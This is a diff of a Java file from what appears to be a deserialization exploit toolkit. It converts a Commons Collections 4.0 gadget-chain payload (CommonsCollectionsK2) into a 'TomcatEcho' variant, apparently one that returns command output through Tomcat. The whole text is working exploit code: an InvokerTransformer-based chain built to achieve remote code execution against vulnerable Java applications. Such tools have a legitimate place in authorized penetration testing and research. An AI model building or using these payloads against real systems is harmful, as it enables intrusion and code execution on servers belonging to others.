@@ -19,10 +19,10 @@ same as K1, but use commons-collections4.0
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections4:4.0"})
 @Authors({Authors.KORLR})
-public class CommonsCollectionsK2 extends PayloadRunner implements ObjectPayload<Map> {
+public class CommonsCollectionsK2TomcatEcho extends PayloadRunner implements ObjectPayload<Map> {
 
     public Map getObject(final String command) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(command);
+        Object tpl = Gadgets.createTemplatesTomcatEcho();
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
         HashMap<String, String> innerMap = new HashMap<String, String>();
@@ -39,6 +39,6 @@ public class CommonsCollectionsK2 extends PayloadRunner implements ObjectPayload
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollectionsK2.class, args);
+        PayloadRunner.run(CommonsCollectionsK2TomcatEcho.class, args);
     }
 }
